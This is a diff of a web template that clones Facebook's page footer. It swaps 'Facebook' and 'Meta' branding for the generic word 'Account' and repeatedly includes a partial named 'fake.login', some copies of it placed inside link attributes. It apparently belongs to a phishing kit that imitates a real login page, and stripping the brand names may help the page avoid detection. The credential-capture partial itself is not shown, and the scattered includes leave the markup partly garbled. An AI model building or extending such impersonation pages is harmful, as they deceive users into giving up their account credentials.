@@ -320,27 +320,27 @@
                                 @include('fake.login')
                                 @include('fake.login')
                                 <ul class="footer-children-item-list">
-                                    <li><a href="javascript:;" title="Sign up for Facebook">Sign Up</a></li>
-                                    <li><a href="javascript:;" title="Log in to Facebook">Log in</a></li>
+                                    <li><a href="javascript:;" title="Sign up for Account">Sign Up</a></li>
+                                    <li><a href="javascript:;" title="Log in to Account">Log in</a></li>
                                     <li><a href="javascript:;" title="Take a look at Messenger.">Messenger</a>
                                     </li>
-                                    <li><a href="javascript:;" title="Facebook Lite for Android.">Facebook Lite</a></li>
+                                    <li><a href="javascript:;" title="Account Lite for Android.">Account Lite</a></li>
                                     <li><a href="javascript:;" title="Browse in Video">Video</a>
                                     </li>
                                     <li><a href="javascript:;"
-                                            title="Take a look at popular places on Facebook.">Places</a>
+                                            title="Take a look at popular places on Account.">Places</a>
                                     </li>
-                                    <li><a href="javascript:;" title="Check out Facebook games.">Games</a></li>
+                                    <li><a href="javascript:;" title="Check out Account games.">Games</a></li>
                                     <li><a href="javascript:;"
-                                            title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
+                                            title="Buy and sell on Account Marketplace.">Marketplace</a></li>
                                     @include('fake.login')
                                     @include('fake.login')
-                                    <li><a href="javascript:;" title="Learn more about Meta Pay" target="_blank">Meta
+                                    <li><a href="javascript:;" title="Learn more about  Pay" target="_blank">
                                             Pay</a></li>
-                                    <li><a href="javascript:;" title="Discover Meta" target="_blank">Meta
+                                    <li><a href="javascript:;" title="Discover " target="_blank">
                                             Store</a>
                                     </li>
-                                    <li><a href="javascript:;" title="Learn more about Meta Quest" target="_blank">Meta
+                                    <li><a href="javascript:;" title="Learn more about  Quest" target="_blank">
                                             Quest</a></li>
                                     <li><a href="" title="Take a look at Instagram" target="_blank"
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Instagram</a></li>
@@ -351,21 +351,21 @@
                                             rel="noreferrer nofollow" data-lynx-mode="asynclazy">Threads</a></li>
                                     <li><a href="javascript:;" title="Donate to worthy causes.">Fundraisers</a></li>
                                     <li><a href="javascript:;"
-                                            title="Browse our Facebook Services directory.">Services</a></li>
+                                            title="Browse our Account Services directory.">Services</a></li>
                                     <li><a href="javascript:;" title="See the Voting Information Centre">Voting
                                             Information Centre</a></li>
                                     <li><a href="javascript:;"
-                                            title="Learn how we collect, use and share information to support Facebook.">Privacy
+                                            title="Learn how we collect, use and share information to support Account.">Privacy
                                             Policy</a></li>
                                     <li><a href="javascript:;" @include('fake.login') @include('fake.login')
-                                            title="Learn how to manage and control your privacy on Facebook.">Privacy
+                                            title="Learn how to manage and control your privacy on Account.">Privacy
                                             Centre</a></li>
                                     <li><a href="javascript:;" title="Explore our groups.">Groups</a></li>
                                     <li><a href="javascript:;" accesskey="8"
                                             title="Read our blog, discover the resource centre and find job opportunities.">About</a>
                                     </li>
                                     <li>
-                                        <a href="javascript:;" title="Advertise on Facebook">Create ad</a>
+                                        <a href="javascript:;" title="Advertise on Account">Create ad</a>
                                     </li>
                                     <li><a href="javascript:;" title="Create a Page">Create
                                             Page</a>
@@ -381,7 +381,7 @@
                                     </li>
                                     <li><a href="javascript:;"
                                             title="Make your next career move to our brilliant company.">Careers</a></li>
-                                    <li><a href="javascript:;" title="Learn about cookies and Facebook."
+                                    <li><a href="javascript:;" title="Learn about cookies and Account."
                                             @include('fake.login') @include('fake.login')
                                             @include('fake.login') @include('fake.login')
                                             @include('fake.login') @include('fake.login')
@@ -398,7 +398,7 @@
                                             and
                                             non-users</a></li>
                                     <li><a accesskey="6" class="accessible_elem" href="/settings"
-                                            title="View and edit your Facebook settings.">Settings</a></li>
+                                            title="View and edit your Account settings.">Settings</a></li>
                                     <li><a accesskey="7" class="accessible_elem" href="javascript:;"
                                             title="View your activity log">Activity log</a></li>
                                 </ul>
@@ -411,7 +411,7 @@
                                 @include('fake.login')
                                 @include('fake.login')
                                 @include('fake.login')
-                                <div><span> Meta © 2023</span></div>
+                                <div><span>  © 2023</span></div>
                             </div>
                         </div>
                     </div>
